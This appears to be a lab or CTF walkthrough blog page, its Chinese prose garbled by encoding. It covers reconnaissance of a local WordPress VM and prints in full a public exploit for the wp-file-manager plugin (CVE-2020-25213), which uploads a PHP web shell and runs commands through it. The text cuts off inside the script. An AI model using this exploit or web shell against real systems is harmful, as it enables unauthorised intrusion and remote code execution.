<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.240.139  </span></span><br><span class="line"><span class="params">sh:</span> <span class="number">0</span>: getcwd() <span class="params">failed:</span> No such file <span class="keyword">or</span> directory</span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">01</span> <span class="number">16</span>:<span class="number">32</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.139</span> (<span class="number">192.168</span>.<span class="number">240.139</span>)</span><br><span class="line">Host is up (<span class="number">0.0026</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Apache2 Ubuntu Default <span class="params">Page:</span> It works</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.41</span> (Ubuntu)</span><br><span class="line">MAC <span class="params">Address:</span> B2:A7:<span class="number">1</span>A:<span class="number">3</span>F:<span class="number">30</span>:A9 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.61</span> ms <span class="number">192.168</span>.<span class="number">240.139</span> (<span class="number">192.168</span>.<span class="number">240.139</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.33</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>æ˜¾ç¤ºåªæœ‰ä¸€ä¸ª80çš„webç«¯å£ æˆ‘ä»¬ä¸‹ä¸€æ­¥å°±å»webæ‰¾æ›´å¤šä¿¡æ¯</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>webé»˜è®¤ç•Œé¢æ˜¯ubuntuç³»ç»Ÿç•Œé¢ï¼Œæ²¡æœ‰å¤šä½™ä¿¡æ¯<br>ç›®å½•æ‰«æï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.240.139</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.240.139/_25-02-01_16-36-17.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span>                                     </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">17</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">18</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">24</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">323</span>B  <span class="operator">-</span> <span class="symbol">/javascript</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="operator">/</span>javascript<span class="symbol">/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/secret</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.139</span><span class="operator">/</span>secret<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">16</span>:<span class="number">36</span>:<span class="number">27</span>] <span class="number">404</span> <span class="operator">-</span>  <span class="number">225</span>B  <span class="operator">-</span> <span class="operator">/</span>secret<span class="symbol">/</span>                                          </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°ä¸¤ä¸ªç›®å½• </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl http://192.168.240.139/javascript/</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You don&#x27;t have permission to access this resource.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.41 (Ubuntu) Server at 192.168.240.139 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>javascriptè¿™ä¸ªç›®å½•æ²¡æœ‰æƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl http://192.168.240.139/secret/    </span><br><span class="line">Neither &lt;b&gt;/etc/wordpress/config-192.168.240.139.php&lt;/b&gt; nor &lt;b&gt;/etc/wordpress/config-168.240.139.php&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.   </span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥è¿™ä¸ªsecretç›®å½•ä¸‹é¢æ˜¯wordpressæœåŠ¡ï¼Œä½†æ˜¯æ— æ³•è§£æ<br>ç»§ç»­ç”¨dirsearchæ‰«æsecretä¸‹çš„ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# dirsearch -u <span class="number">192.168</span>.<span class="number">240.139</span><span class="regexp">/secret/</span>                        </span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/python3/</span>dist-packages<span class="regexp">/dirsearch/</span>dirsearch.py:<span class="number">23</span>: DeprecationWarning: pkg_resources is deprecated as an API. See https:<span class="comment">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  <span class="keyword">from</span> pkg_resources <span class="keyword">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist <span class="keyword">size</span>: <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="keyword">File</span>: <span class="regexp">/root/</span>tmp<span class="regexp">/reports/</span>_192.<span class="number">168.240</span>.<span class="number">139</span>/_secret__25-<span class="number">02</span>-<span class="number">01</span>_16-<span class="number">42</span>-<span class="number">21</span>.txt</span><br><span class="line"></span><br><span class="line">Target: http:<span class="comment">//192.168.240.139/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">21</span>] Starting: secret/</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.ht_wsr.txt                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.save                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.sample</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.orig</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess.bak1                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_extra                           </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessBAK</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessOLD</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htm                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.html</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_sc</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htpasswds                                </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccess_orig                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htaccessOLD2</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.httr-oauth                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.htpasswd_test                            </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">22</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>.php                                      </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">33</span>] <span class="number">200</span> -    <span class="number">3</span>KB - <span class="regexp">/secret/</span>readme.html                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">328</span>B  - <span class="regexp">/secret/</span>wp-admin  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-admin/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">330</span>B  - <span class="regexp">/secret/</span>wp-content  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-content/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">471</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/upgrade/</span>                       </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">331</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-includes/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -  <span class="number">613</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/plugins/</span>akismet/akismet.php    </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -  <span class="number">613</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/plugins/</span>akismet/admin.php</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>/                              </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">488</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/uploads/</span>                       </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">514</span>B  - <span class="regexp">/secret/</span>wp-content/                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -    <span class="number">0</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>/rss-functions.php             </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">39</span>] <span class="number">500</span> -    <span class="number">3</span>KB - <span class="regexp">/secret/</span>wp-admin/setup-config.php </span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°ä¸€äº›ç›®å½•<br>wp-contentè¿™ä¸ªç›®å½•æ˜¯ä¸€äº›wordpressçš„æ–‡ä»¶ ä¹Ÿåªæœ‰è¿™ä¸ªç›®å½•ä¸‹é¢æœ‰æœ‰ç”¨çš„ä¿¡æ¯<br><img src="https://pic1.imgdb.cn/item/679de013d0e0a243d4f973a0.png"></p>
<p>æ‰¾åˆ°äº†ä¸€ä¸ªæ’ä»¶<br><img src="https://pic1.imgdb.cn/item/679ddfe5d0e0a243d4f9739e.png"><br>è¿™é‡Œå°±ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨æ’ä»¶çš„æ¼æ´äº†ï¼Œçœ‹ç¾¤ä¸»ll104567çš„è§†é¢‘æœ‰äº†åé¢çš„è¿›å±• å…ˆç”¨searchsploitæ‰¾åˆ°åˆ©ç”¨çš„pyè„šæœ¬</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># searchsploit        wp-file-manager   </span></span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line"> Exploit Title                                                                     |  Path</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line">WP-<span class="built_in">file</span>-manager v6<span class="number">.9</span> - Unauthenticated Arbitrary File Upload leading <span class="built_in">to</span> RCE        | php/webapps/<span class="number">51224.</span>py</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># searchsploit -m 51224</span></span><br><span class="line">  Exploit: WP-<span class="built_in">file</span>-manager v6<span class="number">.9</span> - Unauthenticated Arbitrary File Upload leading <span class="built_in">to</span> RCE</span><br><span class="line">      <span class="built_in">URL</span>: <span class="keyword">https</span>://www.exploit-db.com/exploits/<span class="number">51224</span></span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/<span class="number">51224.</span>py</span><br><span class="line">    Codes: CVE<span class="number">-2020</span><span class="number">-25213</span></span><br><span class="line"> Verified: True</span><br><span class="line">File Type: Python script, ASCII <span class="keyword">text</span> executable, <span class="keyword">with</span> very <span class="keyword">long</span> <span class="keyword">lines</span> (<span class="number">501</span>)</span><br><span class="line">Copied <span class="built_in">to</span>: /root/tmp/<span class="number">51224.</span>py</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æŸ¥çœ‹è¿™ä¸ªè„šæœ¬åšäº†ä»€ä¹ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># cat 51224.py                             </span></span><br><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE</span></span><br><span class="line"><span class="comment"># Date: [ 22-01-2023 ]</span></span><br><span class="line"><span class="comment"># Exploit Author: [BLY]</span></span><br><span class="line"><span class="comment"># Vendor Homepage: [https://wpscan.com/vulnerability/10389]</span></span><br><span class="line"><span class="comment"># Version: [ File Manager plugin 6.0-6.9]</span></span><br><span class="line"><span class="comment"># Tested on: [ Debian ]</span></span><br><span class="line"><span class="comment"># CVE : [ CVE-2020-25213 ]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">import</span> sys,signal,time,requests</span><br><span class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</span><br><span class="line"><span class="comment">#from pprint import pprint</span></span><br><span class="line"></span><br><span class="line">def handler(sig,frame):</span><br><span class="line">	print (<span class="string">&quot;[!]Saliendo&quot;</span>)</span><br><span class="line">	sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT,handler)</span><br><span class="line"></span><br><span class="line">def commandexec(command):</span><br><span class="line"></span><br><span class="line">	<span class="attr">exec_url</span> <span class="operator">=</span> url<span class="operator">+</span><span class="string">&quot;/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php&quot;</span></span><br><span class="line">	<span class="attr">params</span> <span class="operator">=</span> &#123;</span><br><span class="line">		<span class="string">&quot;cmd&quot;</span>:command</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="attr">r</span><span class="operator">=</span>requests.get(exec_url,params<span class="operator">=</span>params)</span><br><span class="line"></span><br><span class="line">	<span class="attr">soup</span> <span class="operator">=</span> BeautifulSoup(r.text, &#x27;html.parser&#x27;)</span><br><span class="line">	<span class="attr">text</span> <span class="operator">=</span> soup.get_text()</span><br><span class="line"></span><br><span class="line">	print (text)</span><br><span class="line">def exploit():</span><br><span class="line"></span><br><span class="line">	global url</span><br><span class="line"></span><br><span class="line">	<span class="attr">url</span> <span class="operator">=</span> sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="attr">command</span> <span class="operator">=</span> sys.argv[<span class="number">2</span>]</span><br><span class="line">	<span class="attr">upload_url</span> <span class="operator">=</span> url<span class="operator">+</span><span class="string">&quot;/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="attr">headers</span> <span class="operator">=</span> &#123;</span><br><span class="line">			&#x27;<span class="params">content-type&#x27;:</span> <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryvToPIGAB0m9SB1Ww&quot;</span>,</span><br><span class="line">			&#x27;<span class="params">Connection&#x27;:</span> <span class="string">&quot;close&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="attr">payload</span> <span class="operator">=</span> <span class="string">&quot;------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>cmd<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>upload<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>target<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>l1_Lw<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>upload[]<span class="char escape_">\&quot;</span>; filename=<span class="char escape_">\&quot;</span>shell.php<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Type: application/x-php<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;?php echo <span class="char escape_">\&quot;</span>&lt;pre&gt;<span class="char escape_">\&quot;</span> . shell_exec($_REQUEST[&#x27;cmd&#x27;]) . <span class="char escape_">\&quot;</span>&lt;/pre&gt;<span class="char escape_">\&quot;</span>; ?&gt;<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww--&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="params">try:</span></span><br><span class="line">		<span class="attr">r</span><span class="operator">=</span>requests.post(upload_url,data<span class="operator">=</span>payload,headers<span class="operator">=</span>headers)</span><br><span class="line">		<span class="comment">#pprint(r.json())</span></span><br><span class="line">		commandexec(command)</span><br><span class="line">	<span class="params">except:</span></span><br><span class="line">		print(<span class="string">&quot;[!] Algo ha salido mal...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def help():</span><br><span class="line"></span><br><span class="line">	print (<span class="string">&quot;<span class="char escape_">\n</span>[*] Uso: python3&quot;</span>,sys.argv[<span class="number">0</span>],<span class="string">&quot;<span class="char escape_">\&quot;</span>url<span class="char escape_">\&quot;</span> <span class="char escape_">\&quot;</span>comando<span class="char escape_">\&quot;</span>&quot;</span>)</span><br><span class="line">	print (<span class="string">&quot;[!] Ejemplo: python3&quot;</span>,sys.argv[<span class="number">0</span>],<span class="string">&quot;http://wordpress.local/ 